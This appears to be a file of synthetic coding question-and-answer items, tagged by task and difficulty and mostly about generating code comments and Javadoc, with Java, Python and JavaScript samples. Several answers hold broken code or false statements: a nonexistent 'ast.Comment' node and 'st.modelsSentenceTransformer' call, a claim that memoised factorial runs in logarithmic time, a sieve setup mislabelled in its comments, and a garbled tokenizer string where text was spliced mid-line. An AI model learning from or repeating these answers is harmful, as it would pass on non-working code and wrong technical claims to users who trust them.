methods=['POST'])\ndef process_data():\n    data = request.json['data']\n    response = data * 2\n    return jsonify({'processed_data': response})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=50052)\n```\n1. Java Service for Database Interaction (REST client for Python service):\n```java\n// DataStoreService.java\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestBody;\nimport org.springframework.web.bind.annotation.RestController;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\n@SpringBootApplication\npublic class DataStoreServiceApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(DataStoreServiceApplication.class, args);\n    }\n}\n\n@RestController\npublic class DataService {\n    @PostMapping(\"/store\")\n    public String storeData(@RequestBody String processedDataJson) {\n        try {\n            ProcessedData processedData = new ObjectMapper().readValue(processedDataJson, ProcessedData.class);\n            // Store data in distributed database logic\n            return \"Data stored successfully\";\n        } catch (Exception e) {\n            return \"Error storing data: \" + e.getMessage();\n        }\n    }\n}\n\nclass ProcessedData {\n    private String data;\n\n    // Getters and Setters\n}\n```\n1. Dockerize services and deploy with Kubernetes:\n- Create Dockerfile for each service\n- Use Docker Compose or Kubernetes manifests to define services, expose ports, and set up dependencies\n- Deploy to a Kubernetes cluster for scaling and fault tolerance\n\nThis solution demonstrates a complex multi-language integration using gRPC for inter-service communication between C# and Python, while Python communicates with the Java service through a REST API. The services are containerized with Docker and deployed with Kubernetes for scalability and resilience."}, {"L2_TASK": "Comment generation", "L3_TASK": "Write a javadoc for this function", "Complexity_Level": "medium", "Response": "The \"Comment generation\" and \"Write a javadoc for this function\" are not directly mentioned in the provided JSON, but they are related to the \"Programming Language Concepts\" category, specifically to documentation and function explanation, which is a common practice in software development.\n\nHere's a medium difficulty problem and its solution:\n\nProblem: Write a Javadoc for a function that calculates the factorial of a given non-negative integer using recursion.\n\n```java\n/**\n * <p>Calculates the factorial of a non-negative integer using recursion.</p>\n * \n * <p>If the input is 0 or 1, the factorial is 1. Otherwise, it multiplies\n * the input number with the factorial of the number one less than it.</p>\n * \n * <p>Throws IllegalArgumentException if the input is negative.</p>\n *\n * @param input The non-negative integer for which to calculate the factorial.\n * @return The factorial of the input integer.\n * @throws IllegalArgumentException if the input is negative.\n */\npublic static int factorial(int input) throws IllegalArgumentException {\n    if (input < 0) {\n        throw new IllegalArgumentException(\"Input must be non-negative.\");\n    }\n    if (input == 0 || input == 1) {\n        return 1;\n    }\n    return input * factorial(input - 1);\n}\n```\n\nConcept: Programming Documentation (Javadoc)"}, {"L2_TASK": "Comment generation", "L3_TASK": "Write a javadoc for this function", "Complexity_Level": "extremely difficult", "Response": "Area: \"Documentation\"\nSub Area: \"Write a Javadoc for this function\"\n\n**Question 1:**\nGiven a complex recursive function in Java that computes the factorial of a non-negative integer using memoization to optimize performance, write an elaborate Javadoc comment explaining its purpose, inputs, outputs, and the optimization technique used.\n\n```java\n/**\n * <p>\n * This advanced function calculates the factorial of a non-negative integer using\n * memoization to optimize performance and avoid redundant computations. The\n * factorial is defined as the product of all positive integers up to and including\n * the input number (n!). This implementation employs a cache, represented by a\n * HashMap, to store previously computed factorial values, thus reducing the time\n * complexity from exponential to logarithmic for repeated input values.\n * </p>\n * \n * <p>\n * The function gracefully handles edge cases like 0 and negative numbers by returning\n * the appropriate factorial value or throwing a custom exception, {@code\n * InvalidInputException}, respectively.\n * </p>\n *\n * @param n The non-negative integer for which the factorial is to be computed. Must be\n *           within the range [0, infinity).\n * @return The factorial of the input integer, n! = 1 * 2 * ... * n.\n * @throws InvalidInputException If the input is negative, an {@code InvalidInputException}\n *                               is thrown with a descriptive error message.\n * @author Expert\n * @since 2003\n * @see java.util.HashMap\n * @see InvalidInputException\n */\npublic long computeFactorialMemoization(int n) throws InvalidInputException {\n    // Implementation of the recursive function with memoization\n}\n```\n\n**Question 2:**\nProvide a comprehensive Javadoc for a Java interface that defines a generic contract for a priority queue data structure that supports dynamic resizing, handles duplicates, and allows efficient insertion and removal of elements. Explain the interface methods, their purpose, and any specific constraints or requirements for implementing classes.\n\n```java\n/**\n * <p>\n * This interface defines a generic contract for a priority queue data structure, which\n * efficiently supports insertion of elements and removal of the highest priority\n * element. The priority queue ensures a specific ordering of elements based on their\n * priority, often implemented using a heap or a balanced tree. It also supports\n * duplicates, dynamic resizing to maintain performance, and optional customization\n * of the comparison function through the use of a Comparator.\n * </p>\n * \n * <p>\n * Implementing classes must adhere to the following constraints:\n * <ul>\n * <li>Insertion of elements ({@link #insert(T)}) should maintain the priority queue\n *     invariant.</li>\n * <li>Removing the highest priority element ({@link #extract()}) must return the\n *     element with the highest priority, or throw an exception if the queue is empty.</li>\n * <li>Peeking at the highest priority element ({@link #peek()}) should not alter the\n *     internal state of the queue.</li>\n * <li>Duplicate elements are allowed; their behavior during insertion and removal\n *     depends on the specific implementation.</li>\n * <li>Resizing should occur automatically when necessary, ensuring that the data\n *     structure's performance remains optimal.</li>\n * <li>Optional: Provide a method to supply a custom Comparator ({@link\n *     #PriorityQueue(Comparator)}) to control the priority ordering.</li>\n * </ul>\n * </p>\n *\n * @param <T> The type of elements stored in the priority queue.\n * @author Expert\n * @since 2005\n * @see java.util.Comparator\n */\npublic interface PriorityQueue<T> {\n\n    /**\n     * Inserts an element into the priority queue.\n     * \n     * @param element The element to be inserted.\n     */\n    void insert(T element);\n\n    /**\n     * Removes and returns the highest priority element from the priority queue.\n     * \n     * @return The highest priority element.\n     * @throws EmptyQueueException If the queue is empty.\n     */\n    T extract() throws EmptyQueueException;\n\n    /**\n     * Returns, but does not remove, the highest priority element from the priority\n     * queue.\n     * \n     * @return The highest priority element, or null if the queue is empty.\n     */\n    T peek();\n\n    /**\n     * Constructs a new priority queue with an optional comparator to customize the\n     * priority ordering.\n     *\n     * @param comparator An optional Comparator for customizing the order, or null for\n     *                   the default ordering.\n     */\n    PriorityQueue<T> PriorityQueue(Comparator<T> comparator);\n}\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Generate comments based on code logic", "Complexity_Level": "medium", "Response": "Area: \"Comment generation\"\nSub Area: \"Generate comments based on code logic\"\nConcept: \"Code analysis and natural language processing\"\n\n**Question 1:**\nGiven a Python function that calculates the factorial of a number using recursion, generate a comment that explains the function's purpose and logic.\n\n```python\ndef factorial(n):\n    if n == 0:\n        return 1\n    else:\n        return n * factorial(n - 1)\n```\nSolution:\n\n```python\n# This function computes the factorial of a given number 'n' recursively.\n# The base case is when n equals 0, in which case the factorial is 1.\n# For any other positive integer 'n', the function returns the product of 'n' and the factorial of (n-1).\n# Example: factorial(5) would calculate 5 * factorial(4), which in turn calculates 4 * factorial(3), and so on, until it reaches the base case.\n```\n\n**Question 2:**\nIn a JavaScript program, there's a function to check if a given number is even or odd. Write a comment that explains the purpose and logic of the function.\n\n```javascript\nfunction isEven(number) {\n    if (number % 2 === 0) {\n        return true;\n    } else {\n        return false;\n    }\n}\n```\nSolution:\n\n```javascript\n// This function determines whether a given 'number' is even or odd.\n// It uses the modulo operator (%) to check if the number divided by 2 has a remainder.\n// If the remainder is 0, the number is even and the function returns 'true'.\n// Otherwise, if the remainder is not 0, the number is odd and the function returns 'false'.\n// Example: isEven(4) would return true because 4 is divisible by 2 with no remainder, while isEven(7) would return false because 7 divided by 2 has a remainder of 1.\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Generate comments based on code logic", "Complexity_Level": "extremely difficult", "Response": "Area: \"Comment generation\" Sub Area: \"Generate comments based on complex algorithmic logic\"\n\nQuestion 1: Given a piece of code that implements a highly optimized version of the Sieve of Eratosthenes for finding prime numbers, generate a detailed comment explaining the logic and optimizations used.\n\n```python\ndef optimized_sieve_of_eratosthenes(n):\n    primes = [True] * (n + 1)\n    primes[0], primes[1] = [None] * 2  # Mark 0 and 1 as non-prime\n\n    limit = int(n**0.5) + 1  # Optimization: Only need to check up to sqrt(n)\n    \n    for i in range(2, limit):\n        if primes[i]:  # If i is prime\n            for multiple in range(i*i, n + 1, i):  # Skip by i to mark multiples non-prime\n                primes[multiple] = False\n                \n    return [i for i in range(2, n + 1) if primes[i]]\n```\n\nExplanation:\n```\n# This optimized function implements the Sieve of Eratosthenes algorithm to efficiently find all prime numbers up to 'n'.\n# 1. Initialize a boolean list 'primes' of size 'n+1', assuming all numbers are prime initially.\n# 2. Immediately mark 0 and 1 as non-prime, as they are not prime numbers.\n# 3. Set 'limit' as the square root of 'n' plus 1, as this is the largest composite number that can be formed by multiplying two primes less than or equal to 'n'.\n# 4. Iterate through numbers from 2 to 'limit'.\n#   a. If 'primes[i]' is True, it means 'i' is a prime number.\n#   b. For each prime 'i', traverse its multiples starting from 'i*i' and incrementing by 'i'. Mark these multiples as non-prime by setting 'primes[multiple]' to False.\n# 5. Return a list containing all indices 'i' where 'primes[i]' is True (i.e., prime numbers).\n```\n\nQuestion 2: Given a recursive function in JavaScript that calculates the nth Fibonacci number using memoization, provide a detailed comment explaining the function's logic and the role of the cache.\n\n```javascript\nfunction fibonacci(n, cache = {}) {\n    if (n <= 0) return 0;  // Base case: Fibonacci of 0 is 0\n    if (n === 1) return 1;  // Base case: Fibonacci of 1 is 1\n\n    // Check if the Fibonacci number for 'n' is already computed and stored in the cache\n    if (cache[n]) return cache[n];\n\n    // Compute the Fibonacci number using recursion and store it in the cache for future use\n    cache[n] = fibonacci(n - 1, cache) + fibonacci(n - 2, cache);\n\n    return cache[n];  // Return the computed Fibonacci number\n}\n```\n\nExplanation:\n```\n# The recursive 'fibonacci' function calculates the nth Fibonacci number using memoization to avoid redundant computations.\n# 1. It takes a number 'n' as input and an optional 'cache' object to store previously computed Fibonacci numbers.\n# 2. The function checks two base cases: if 'n' is 0, the Fibonacci number is 0, and if 'n' is 1, the Fibonacci number is 1.\n# 3. If 'n' is not in the 'cache', the function computes the Fibonacci number recursively.\n#   a. It calculates the Fibonacci number for 'n' by adding the Fibonacci numbers of 'n-1' and 'n-2'.\n#   b. Before returning, the computed Fibonacci number is stored in the 'cache' for future reference.\n# 4. The function returns the Fibonacci number for 'n', either from the 'cache' or after recursive computation.\n# This approach significantly improves performance by reusing previously computed results instead of recalculating them.\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Automatic inline comments", "Complexity_Level": "medium", "Response": "Unfortunately, the given JSON does not contain a direct reference to \"Comment generation\" or \"Automatic inline comments,\" which typically fall under Natural Language Processing (NLP) and AI domains. However, I can still provide two medium complexity problems related to this topic and their solutions using Python, considering the context is a programming language.\n\n**Problem 1:**\nGenerate automatic inline comments for a given Python code snippet by analyzing its syntax and function names.\n\n**Solution:**\n\n```python\nimport re\nfrom typing import List\n\ndef generate_inline_comments(code: str) -> List[str]:\n    comments = []\n    \n    # Extract function definitions\n    function_defs = re.findall(r'def (\\w+)(\\(.+\\))?:', code)\n    \n    for func_name, params in function_defs:\n        comment = f'#{func_name}({params}): ' + generate_func_comment(func_name)\n        comments.append(comment)\n    \n    return comments\n\ndef generate_func_comment(func_name: str) -> str:\n    # This is a placeholder for a more complex NLP model to generate comments based on function name\n    # In practice, you might use a pre-trained model like GPT or BERT for this\n    return f'// This function is responsible for handling {func_name.lower()} operations'\n\n# Given Python code\ncode_snippet = \"\"\"\ndef calculate_total(quantity: int, price: float) -> float:\n    return quantity * price\n\ndef process_payment(total: float):\n    if total > 100:\n        print(\"Payment approved\")\n    else:\n        print(\"Payment declined\")\n\"\"\"\n\ncomments = generate_inline_comments(code_snippet)\nfor comment in comments:\n    print(comment)\n```\n\n**Problem 2:**\nImplement a simplified version of inline comment generation by detecting variable assignments and adding comments describing the variable usage.\n\n**Solution:**\n\n```python\nimport re\n\ndef generate_variable_comments(code: str) -> List[str]:\n    comments = []\n    \n    # Extract variable assignments\n    var_assignments = re.findall(r'\\b(\\w+)\\s*=\\s*(\\w+)', code)\n    \n    for var_name, value in var_assignments:\n        comment = f'#{var_name} = {value}: ' + generate_var_comment(var_name)\n        comments.append(comment)\n    \n    return comments\n\ndef generate_var_comment(var_name: str) -> str:\n    # Simple placeholder comment based on variable name\n    return f'// This variable is used for storing {var_name.lower()} data'\n\ncode_snippet = \"\"\"\ncustomer_name = \"John Doe\"\ntotal_amount = calculate_total(5, 10.5)\n\"\"\"\n\ncomments = generate_variable_comments(code_snippet)\nfor comment in comments:\n    print(comment)\n```\n\nNote: These solutions are simplified examples and do not represent a complete or state-of-the-art NLP solution for automatic inline comment generation. In a real-world scenario, you would likely use advanced NLP techniques and pre-trained models to generate more meaningful and context-aware comments."}, {"L2_TASK": "Comment generation", "L3_TASK": "Automatic inline comments", "Complexity_Level": "extremely difficult", "Response": "The given domain JSON doesn't have a direct category or subcategory for \"Comment generation\" or \"Automatic inline comments.\" However, this topic is related to Natural Language Processing (NLP) and Machine Learning, which could be considered under Data Science or Software Development, particularly in the context of writing a compiler or IDE plugin.\n\nQuestion 1:\nDevelop a deep learning model that generates contextually relevant and concise inline comments for complex code snippets in Python, ensuring the generated comments not only reflect the code's functionality but also capture the intent of the programmer. The model should be able to handle code with various levels of nesting, conditionals, loops, and custom classes.\n\nSolution:\nWe can use a combination of Sequence-to-Sequence models (Seq2Seq) and Attention mechanisms to generate inline comments. This problem is extremely difficult due to the need for the model to understand both the syntax and semantics of the code.\n\nExample code (using Python and PyTorch):\n\n```python\nimport torch\nfrom torch import nn\nfrom transformers import BertTokenizer, BertModel\n\nclass CodeCommentGenerator(nn.Module):\n    def __init__(self, tokenizer, max_length, hidden_size):\n        super(CodeCommentGenerator, self).__init__()\n        self.tokenizer = tokenizer\n        self.encoder = BertModel.from_pretrained('bert-base-uncased')\n        self.decoder = nn.Sequential(\n            nn.Linear(hidden_size, hidden_size),\n            nn.ReLU(),\n            nn.Linear(hidden_size, max_length)\n        )\n        self.hidden_size = hidden_size\n\n    def forward(self, code_tokens, attention_mask):\n        encoded_code = self.encoder(input_ids=code_tokens, attention_mask=attention_mask)[0]\n        mean_encoded = encoded_code.mean(dim=1)\n        comment_ids = self.decoder(mean_encoded)\n        return comment_ids\n\n# Preprocess code snippet and create input tensors\ncode = \"\"\"\ndef complex_function(param1, param2):\n    if param1 > param2:\n        for i in range(param2):\n            if i % 2 == 0:\n                custom_class = CustomClass(param1, i)\n                custom_class.execute()\n    else:\n        result = param1 * param2\n        return result\n\"\"\"\ntokenizer = BertTokenizer.from_pretrained('bert-base-Concept: Natural Language Processing"}, {"L2_TASK": "Comment generation", "L3_TASK": "Update outdated comments", "Complexity_Level": "medium", "Response": "The given area and sub-area aren't directly mentioned in the provided JSON, but they relate to software development and maintenance, which falls under the broader domain of \"Programming Language Concepts\" and \"Development\". The problem and solution can be created in the context of updating outdated comments in a codebase.\n\nQuestion 1:\nGiven a codebase with outdated comments, develop a script that identifies comments containing specific keywords and updates them with the current date.\n\nProblem:\nA developer needs to update all comments in their Python codebase that contain the string \"TODO\" to include the current date, so future developers know when the task was last reviewed.\n\nSolution:\n```python\nimport re\nimport datetime\n\ndef update_todo_comments(file_path):\n    with open(file_path, 'r') as file:\n        code_lines = file.readlines()\n\n    updated_lines = []\n    for line in code_lines:\n        if 'TODO' in line:\n            # Extract the part before and after 'TODO' for context\n            before_todo, after_todo = re.split(r'\\s*TODO\\s*', line, maxsplit=1)\n            updated_line = f\"{before_todo}TODO {datetime.datetime.now().strftime('%Y-%m-%d')} {after_todo}\"\n            updated_lines.append(updated_line)\n        else:\n            updated_lines.append(line)\n\n    with open(file_path, 'w') as file:\n        file.writelines(updated_lines)\n\n# Example usage\nupdate_todo_comments('my_code.py')\n```\nConcept: File handling, Regular expressions\n\nQuestion 2:\nIn a Java project, create a tool to parse source code files and modify Javadoc comments with outdated release version information to the latest version.\n\nProblem:\nA Java project has outdated Javadoc comments with release version numbers. The task is to update all such comments to reflect the latest version, which is read from a `pom.xml` file.\n\nSolution:\n```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class JavadocUpdater {\n\n    static final Pattern JAVADOC_PATTERN = Pattern.compile(\"@version\\\\s+(\\\\d+\\\\.\\\\d+\\\\.\\\\d+)\");\n\n    public static void main(String[] args) throws IOException {\n        String latestVersion = readLatestVersionFromPom(\"pom.xml\");\n        Files.walk(Paths.get(\"src/main/java\"))\n             .filter(Files::isRegularFile)\n             .forEach(path -> updateFile(path, latestVersion));\n    }\n\n    private static String readLatestVersionFromPom(String pomPath) throws IOException {\n        String content = new String(Files.readAllBytes(Paths.get(pomPath)));\n        Pattern versionPattern = Pattern.compile(\"<version>(\\\\d+\\\\.\\\\d+\\\\.\\\\d+)</version>\");\n        Matcher matcher = versionPattern.matcher(content);\n        if (matcher.find()) {\n            return matcher.group(1);\n        }\n        throw new IllegalStateException(\"Could not find version in pom.xml\");\n    }\n\n    private static void updateFile(Path filePath, String latestVersion) throws IOException {\n        String fileContent = new String(Files.readAllBytes(filePath));\n        Matcher matcher = JAVADOC_PATTERN.matcher(fileContent);\n        StringBuffer updatedContent = new StringBuffer();\n        while (matcher.find()) {\n            matcher.appendReplacement(updatedContent, \"@version \" + latestVersion);\n        }\n        matcher.appendTail(updatedContent);\n        Files.write(filePath, updatedContent.toString().getBytes());\n    }\n}\n```\nConcept: File handling, Regular expressions, String manipulation"}, {"L2_TASK": "Comment generation", "L3_TASK": "Update outdated comments", "Complexity_Level": "extremely difficult", "Response": "Area: \"Comment generation\" Sub Area: \"Update outdated comments\"\n\nProblem: Develop a complex and robust system that automatically identifies outdated comments in a large codebase (e.g., a million lines of code across multiple languages) and generates updated comments based on the current code's functionality and best coding practices. The system should consider the code context, usage patterns, and recent modifications, while adhering to a style guide and ensuring semantic correctness.\n\nConcept: Natural Language Processing (NLP), Code Analysis\n\nSolution:\n\n1. First, the system needs to parse the codebase and extract comments and corresponding code blocks. This can be done using a language-agnostic parser, like the Abstract Syntax Tree (AST) representation.\n\nExample (Python, using `ast` module):\n```python\nimport ast\n\ndef extract_comments_and_code(code):\n    tree = ast.parse(code)\n    comments = []\n    code_blocks = []\n\n    for node in ast.walk(tree):\n        if isinstance(node, ast.AST):\n            if hasattr(node, 'lineno'):\n                if isinstance(node, ast.Comment):\n                    comments.append(node.value)\n                else:\n                    code_blocks.append(node)\n\n    return comments, code_blocks\n```\n1. Next, we'll identify outdated comments by comparing the comment's content with the code it describes. This involves NLP techniques like semantic similarity and code summarization.\n\nConcept: Semantic Similarity, Code Summarization\n\nExample (Python, using `sbert` for semantic similarity and `pycogent` for AST-based code summarization):\n```python\nimport sentence_transformers as st\nfrom pycogent import parse\n\ndef is_outdated(comment, code_block):\n    code_summary = code_to_summary(code_block)\n    comment_embedding = st.modelsSentenceTransformer('all-MiniLM-L6-v2').encode(comment)\n    summary_embedding = st.modelsSentenceTransformer('all-MiniLM-L6-v2').encode(code_summary)\n    similarity = cosine_similarity(comment_embedding, summary_embedding)\n    return similarity < 0.8\n\ndef code_to_summary(code_block):\n    # AST-based code summarization logic goes here\n    # ...\n    return summary\n```\n1. Now, generate updated comments using a combination of code summarization, style guide rules, and recent modifications.\n\nConcept: Code Generation, Style Guide Compliance\n\nExample (Python, using `black` for style guide compliance):\n```python\nfrom black import format_str\n\ndef generate_updated_comment(code_block, style_guide):\n    code_summary = code_to_summary(code_block)\n    updated_comment = f\"#{style_guide.format_comment(code_summary)}\"\n\n    return updated_comment\n\n# Style guide rules can be applied, e.g., using `black`\nstyle_guide = BlackStyle()\nupdated_comment = generate_updated_comment(code_block, style_guide)\n```\n1. Finally, batch update comments in the codebase and commit changes if they pass a validation process, which can include code review, static analysis, and testing.\n\nThis solution involves a combination of language processing, code analysis, and software engineering practices. The actual implementation would require more extensive work, including integrating with version control systems, setting up the NLP models, and refining the comment generation and comparison algorithms."}, {"L2_TASK": "Comment generation", "L3_TASK": "Generate comments for algorithms", "Complexity_Level": "medium", "Response": "Area: \"Algorithms\"\nSub Area: \"Generate comments for algorithms\"\n\nProblem: Develop a medium complexity algorithm to reverse a linked list and provide suitable comments to explain the logic.\n\nConcept: \"Linked Lists\"\n\nSolution:\n\n```python\n# Define a Node class with two attributes: 'data' and 'next'\nclass Node:\n    def __init__(self, data=None):\n        self.data = data\n        self.next = None\n\n# Define a function to reverse a linked list\ndef reverse_linked_list(head):\n    # Initialize three pointers: prev (None), current (head), and next_temp (None)\n    prev = None\n    current = head\n    next_temp = None\n\n    # Iterate through the linked list until current is None\n    while current:\n        # Store the next node in next_temp\n        next_temp = current.next\n\n        # Reverse the link by pointing current's next to previous node\n        current.next = prev\n\n        # Move prev and current pointers one step forward\n        prev = current\n        current = next_temp\n\n    # Return the new head of the reversed linked list\n    return prev\n\n# Create a sample linked list: 1 -> 2 -> 3 -> 4 -> 5\nhead = Node(1)\nhead.next = Node(2)\nhead.next.next = Node(3)\nhead.next.next.next = Node(4)\nhead.next.next.next.next = Node(5)\n\n# Reverse the linked list and print the reversed list's elements\nreversed_head = reverse_linked_list(head)\ncurrent = reversed_head\nwhile current:\n    print(current.data, end=\" -> \")\n    current = current.next\n```\n\nExplanation:\n1. The `reverse_linked_list` function takes the head of the linked list as input.\n2. Three pointers, `prev`, `current`, and `next_temp`, are initialized. `prev` starts as `None`, `current` as `head`, and `next_temp` as `None`.\n3. A `while` loop runs as long as `current` is not `None`. Inside the loop:\n   a. `next_temp` is set to `current.next` to store the next node's reference.\n   b. `current.next` is set to `prev` to reverse the link of the current node.\n   c. `prev` and `current` pointers are updated, with `prev` becoming `current` and `current` becoming `next_temp`.\n4. After the loop, `prev` becomes the new head of the reversed linked list.\n5. The reversed linked list is printed to verify the result."}, {"L2_TASK": "Comment generation", "L3_TASK": "Generate comments for algorithms", "Complexity_Level": "extremely difficult", "Response": "The given JSON doesn't have a specific category for \"Comment generation\" or \"Generate comments for algorithms\". However, this task generally falls under the broader domain of \"Programming Language Concepts\" and \"DS/Algo\". I will create a problem and provide a solution using the concept of \"Polymorphism\" and \"Algorithms\" to generate comments for a complex algorithm.\n\n**Problem:**\nDesign a polymorphic function in Python that analyzes and generates detailed comments for a variety of sorting algorithms, improving code readability and maintainability. The function should be able to understand the structure of the algorithms, extract key information, and generate human-readable descriptions.\n\n**Solution:**\n\n```python\nfrom typing import List, Callable\n\n\nclass AlgorithmCommentGenerator:\n    def __init__(self, algorithm: Callable[[List[int]], List[int]]) -> None:\n        self.algorithm = algorithm\n        self.input_list = [10, 5, 8, 1, 9, 3]\n\n    def analyze(self) -> str:\n        # Analyze the algorithm and return a comment\n        pass  # This is a placeholder; the actual implementation would be complex\n\n\nclass BubbleSortCommentGenerator(AlgorithmCommentGenerator):\n    def analyze(self) -> str:\n        sorted_list = self.algorithm(self.input_list)\n        num_swaps = self.count_swaps(sorted_list)\n        if num_swaps == 0:\n            return \"The list was already sorted.\"\n        else:\n            return f\"Performed {num_swaps} swaps to sort the list.\"\n\n    def count_swaps(self, sorted_list: List[int]) -> int:\n        swaps = 0\n        for i in range(len(sorted_list) - 1):\n            for j in range(len(sorted_list) - 1 - i):\n                if sorted_list[j] > sorted_list[j + 1]:\n                    sorted_list[j], sorted_list[j + 1] = sorted_list[j + 1], sorted_list[j]\n                    swaps += 1\n        return swaps\n\n\ndef bubble_sort(arr: List[int]) -> List[int]:\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n - i - 1):\n            if arr[j] > arr[j + 1]:\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\n    return arr\n\n\n# Example usage\nalgo = bubble_sort\ncomment_generator = BubbleSortCommentGenerator(algo)\nprint(comment_generator.analyze())\n```\n\n**Concept: Polymorphism**\n\nIn the solution, the `AlgorithmCommentGenerator` is a base class with an abstract `analyze` method. The `BubbleSortCommentGenerator` is a subclass that implements the `analyze` method specifically for bubble sort. This demonstrates polymorphism, as the `analyze` method can be overridden to provide different behavior for different sorting algorithms.\n\nThe actual implementation of the `analyze` method would involve a complex process of code analysis, possibly leveraging aspects of static analysis, control flow, and data flow to understand the algorithm's inner workings. This could include identifying key patterns, such as nested loops for comparison and swapping, and extracting information like the number of iterations or comparisons made. However, the complexity of such an implementation is beyond the scope of this example."}, {"L2_TASK": "Comment generation", "L3_TASK": "Comment based on code complexity", "Complexity_Level": "medium", "Response": "The given domain JSON doesn't have a direct match for \"Comment generation\" or \"Comment based on code complexity\". However, we can create a problem related to code complexity analysis and generating comments accordingly. We will focus on the \"Programming Language Concepts\" category, specifically on \"Polymorphism\" and \"Control\" concepts.\n\nProblem 1:\nGiven a code snippet in Java that implements polymorphism and uses control structures, generate a comment that describes the complexity and purpose of the code. The code checks the type of an object at runtime and performs different actions based on the type.\n\n```java\npublic class Animal {\n    public void sound() {\n        System.out.println(\"Animal makes a sound\");\n    }\n}\n\npublic class Dog extends Animal {\n    @Override\n    public void sound() {\n        System.out.println(\"Dog barks\");\n    }\n}\n\npublic class Cat extends Animal {\n    @Override\n    public void sound() {\n        System.out.println(\"Cat meows\");\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        Animal animal1 = new Animal();\n        Animal animal2 = new Dog();\n        Animal animal3 = new Cat();\n\n        makeSound(animal1);\n        makeSound(animal2);\n        makeSound(animal3);\n    }\n\n    public static void makeSound(Animal animal) {\n        if (animal instanceof Dog) {\n            System.out.println(\"The animal is a dog\");\n            ((Dog) animal).sound();\n        } else if (animal instanceof Cat) {\n            System.out.println(\"The animal is a cat\");\n            ((Cat) animal).sound();\n        } else {\n            animal.sound();\n        }\n    }\n}\n```\nConcept: Polymorphism, Control\n\nComment:\n```markdown\nThis Java code demonstrates the use of polymorphism through inheritance, where the base class `Animal` is extended by two subclasses, `Dog` and `Cat`. The `sound()` method is overridden in each subclass to provide specific behavior. The `makeSound()` method in the `Main` class acts as a control structure, using instanceof checks to determine the type of the `Animal` object at runtime and calling the appropriate `sound()` implementation. The complexity of this code is medium due to the need to handle different object types dynamically, ensuring correct behavior while maintaining a clear structure.\n```\n\nProblem 2:\nGiven a code snippet in Python that uses a loop and a nested if statement to find the longest common subsequence (LCS) between two strings, generate a comment that describes the complexity and purpose of the code.\n\n```python\ndef lcs(X, Y):\n    m = len(X)\n    n = len(Y)\n    L = [[0 for x in range(n+1)] for x in range(m+1)]\n    \n    for i in range(m+1):\n        for j in range(n+1):\n            if i == 0 or j == 0:\n                L[i][j] = 0\n            elif X[i-1] == Y[j-1]:\n                L[i][j] = L[i-1][j-1] + 1\n            else:\n                L[i][j] = max(L[i-1][j], L[i][j-1])\n    \n    index = L[m][n]\n    lcs = [\"\"] * (index+1)\n    lcs[index] = \"\"\n    \n    i = m\n    j = n\n    while i > 0 and j > 0:\n        if X[i-1] == Y[j-1]:\n            lcs[index-1] = X[i-1]\n            i -= 1\n            j -= 1\n            index -= 1\n        elif L[i-1][j] > L[i][j-1]:\n            i -= 1\n        else:\n            j -= 1\n    \n    return \"\".join(lcs)\n\nX = \"ABCBDAB\"\nY = \"BDCAB\"\nprint(lcs(X, Y))\n```\nConcept: Control, Loops\n\nComment:\n```markdown\nThis Python code calculates the longest common subsequence (LCS) between two strings, `X` and `Y`, using dynamic programming and control structures. The outer loop iterates over the characters of `X`, while the inner loop iterates over the characters of `Y`. The `L` matrix stores the lengths of the LCS at each step. The complexity of the solution is medium, as it involves nested loops with a time complexity of O(m * n), where m and n are the lengths of the input strings. The code effectively determines the LCS by backtracking through the `L` matrix, resulting in a linear time complexity for extracting the LCS sequence itself.\n```"}, {"L2_TASK": "Comment generation", "L3_TASK": "Comment based on code complexity", "Complexity_Level": "extremely difficult", "Response": "Domain: Programming Language Concepts\n\nConcept: Comment based on code complexity\n\nQuestion 1:\nGiven an extremely complex, recursive function that implements a deep copy of a nested data structure, generate a detailed comment summarizing the function's purpose, algorithm, and potential edge cases. Additionally, provide a brief discussion on performance implications and memory usage.\n\n```python\ndef deep_copy_complex_structure(nested_dict: dict) -> dict:\n    \"\"\"\n    Generate a deep copy of a deeply nested dictionary with potentially mutable elements like lists and dictionaries.\n\n    Algorithm:\n    1. Check if input is a dictionary. If not, return a shallow copy using 'copy()' for other types.\n    2. Create an empty dictionary for the new copy.\n    3. Iterate over key-value pairs in the input dictionary.\n    4. If the value is a dictionary, recursively call 'deep_copy_complex_structure()' and assign the returned copy.\n    5. If the value is a list, convert it to a list and, again, recursively call 'deep_copy_complex_structure()' for each element.\n    6. For other types, make a shallow copy using 'copy()'.\n    7. Return the new, deep-copied dictionary.\n\n    Edge Cases:\n    - Self-referential structures: The function will enter an infinite loop if not properly handled.\n    - Large nested structures: Excessive memory usage and performance degradation due to recursion depth.\n\n    Performance:\n    This function uses recursion, which can lead to a high stack usage for deeply nested structures. If the depth is too large, it can result in a RecursionError. Memory consumption is also high due to creating new copies of each nested element.\n\n    Memory Usage:\n    The function creates a new copy of the entire input, so the memory usage is proportional to the size of the input structure. For very large structures, this can lead to increased memory pressure.\n\n    \"\"\"\n    # Implementation of the function\n    # ...\n```\n\nQuestion 2:\nCreate a complex, multi-threaded program that reads and processes data from a shared resource, and provide a detailed comment explaining the synchronization mechanisms, potential race conditions, and deadlock scenarios. Also, discuss the trade-offs between performance and correctness in your design.\n\n```java\nimport java.util.concurrent.*;\nimport java.util.*;\n\nclass SharedResource {\n    private ConcurrentHashMap<Integer, String> data;\n    private Semaphore semaphore;\n\n    public SharedResource() {\n        data = new ConcurrentHashMap<>();\n        semaphore = new Semaphore(1); // Allows only one thread to access the resource at a time\n    }\n\n    public void addData(int key, String value) {\n        semaphore.acquireUninterruptibly();\n        data.put(key, value);\n        semaphore.release();\n    }\n\n    public String getData(int key) {\n        semaphore.acquireUninterruptibly();\n        String value = data.get(key);\n        semaphore.release();\n        return value;\n    }\n}\n\nclass Worker implements Runnable {\n    private SharedResource resource;\n\n    